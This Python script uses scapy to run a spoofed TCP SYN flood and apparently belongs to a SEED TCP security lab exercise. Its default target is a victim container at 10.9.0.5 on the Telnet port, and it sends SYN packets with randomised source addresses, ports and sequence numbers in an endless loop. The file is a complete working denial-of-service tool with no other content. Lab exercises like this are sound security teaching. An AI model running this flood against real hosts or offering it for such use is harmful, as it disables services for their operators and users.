#!/usr/bin/env python3
"""
SYN flood attack helper for SEED TCP lab (Task 1.1).

Sends spoofed SYNs with random source IP/port/seq toward a target TCP port.
"""

import argparse
from ipaddress import IPv4Address
from random import getrandbits

from scapy.all import IP, TCP, send


def build_arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Spoofed TCP SYN flood (for lab use only)"
    )
    parser.add_argument(
        "-t",
        "--target",
        default="10.9.0.5",
        help="目标IP（默认: 10.9.0.5，即Victim容器）",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=23,
        help="目标端口（默认: 23/Telnet 服务）",
    )
    parser.add_argument(
        "-i",
        "--iface",
        default=None,
        help="可选，发送所用接口名称；默认由 scapy 自动选择",
    )
    parser.add_argument(
        "--inter",
        type=float,
        default=0.0,
        help="两包之间的间隔秒数，默认0表示尽快发送",
    )
    return parser


def main() -> None:
    args = build_arg_parser().parse_args()

    ip = IP(dst=args.target)
    tcp = TCP(dport=args.port, flags="S")
    pkt = ip / tcp

    while True:
        pkt[IP].src = str(IPv4Address(getrandbits(32)))  # 随机源IP
        pkt[TCP].sport = getrandbits(16)  # 随机源端口
        pkt[TCP].seq = getrandbits(32)  # 随机初始序列号
        send(pkt, verbose=0, inter=args.inter, iface=args.iface)


if __name__ == "__main__":
    main()
